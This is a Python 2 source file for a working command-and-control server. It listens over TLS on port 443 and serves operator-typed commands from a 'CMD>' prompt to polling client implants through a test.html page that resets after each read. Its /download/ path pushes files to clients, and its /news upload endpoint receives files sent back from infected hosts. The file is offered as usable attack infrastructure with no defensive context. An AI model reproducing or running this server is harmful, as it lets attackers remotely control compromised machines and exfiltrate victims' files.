#Structure of the server:
# client needs to be configured to check a certain page (in this case test.html, as set in c2_page variable)
# after client retrieves command, c2_page is reset to a blank page
# a user input takes the commands and saves them to c2_page, where they are server and then reset.


import BaseHTTPServer   
import os,cgi,threading,time,ssl

HOST_NAME = '10.0.1.116'   # IP address of c2 server
PORT_NUMBER = 443   # Listening port number 

c2_page = "test.html" #Page to use for client command&Control

f= open(c2_page,"w+") #create the file
f.write("Under Construction")
f.close()

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler): 

    def do_GET(req):
           

                             
        if req.path=='/':#if path is /, serve nothing
            req.send_response(200)
            req.send_header("Content-type", "text/html")  
            req.end_headers()
            req.wfile.write("Under Construction")
            return

        elif req.path=='/test':
            #command = raw_input("CMD> ")   #Take user input
            req.send_response(200)             #HTML status 200 (OK)
            req.send_header("Content-type", "text/html")  
            req.end_headers()
            with open(c2_page, 'rb') as file: 
                req.wfile.write(file.read()) # Read the file and send the contents 
            f= open(c2_page,"w+") #after contents are sent, reset the page. This avoids repeated commands.
            f.write("Under Construction")
            f.close()

        elif '/download/' in req.path:
            path = req.path
            file = path.split('/')
            req.send_response(200)
            req.send_header("Content-type", "text/html")  
            req.end_headers()
            with open(file[-1], 'rb') as file: 
                req.wfile.write(file.read()) # Read the file and send the contents 
            #req.wfile.write('Full path requested is: ' + req.path)

        else:
            req.send_response(404)

            
    def do_POST(req):

        if req.path=='/news':        #/news is used to receive posted files, requested via file upload
            try:
                ctype,pdict=cgi.parse_header(req.headers.getheader('content-type'))
                if ctype=='multipart/form-data':
                    fs=cgi.FieldStorage(fp=req.rfile,headers=req.headers,environ={'REQUEST_METHOD':'POST'})
                else:
                    print "[-] Unexpected POST request"
                fs_up=fs['file']                #Here file is the key to hold the actual file
                fname=fs_up.filename
                fname=fname.split("\\")[-1]
                fname=fname.strip(' ')
                print "Receiving file: "+fname
                with open(fname,'wb') as o:  #Create new file with filename found in form data: Content-Disposition: form-data; name="file"; filename="XXXX"
                    o.write(fs_up.file.read())
                    req.send_response(200)
                    req.end_headers()
            except Exception as e:
                    print e
            return 
        req.send_response(200)                        
        req.end_headers()
        length  = int(req.headers['Content-Length'])   #Define the length which means how many bytes the HTTP POST data contains                                              
        postVar = req.rfile.read(length)               # Read then print the posted data
        print postVar
        
def start_c2():

    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)

    httpd.socket = ssl.wrap_socket (httpd.socket,
        keyfile="key_unencrypted.pem",
        certfile='cert.pem', server_side=True)
    
    try:
        print '[+] Server starting'
        httpd.serve_forever()
        
    except KeyboardInterrupt:   
        print '[!] Server is terminated'
        httpd.server_close()


def c2():

    command = raw_input("CMD> ")
    f= open(c2_page,"w+")
    f.write(command)
    f.close()


if __name__ == '__main__':    
    
    
    try:    

        #print 'Setting up thread'  
        d = threading.Thread(target=start_c2)

        #print 'Running as daemon'
        d.setDaemon(True)
        #print '[+] Server starting'
        d.start()
        time.sleep(1)
        print '[+] Server started'

        while True:
            c2()

    except KeyboardInterrupt:   
        print '[!] Server is terminated in main thread'
        
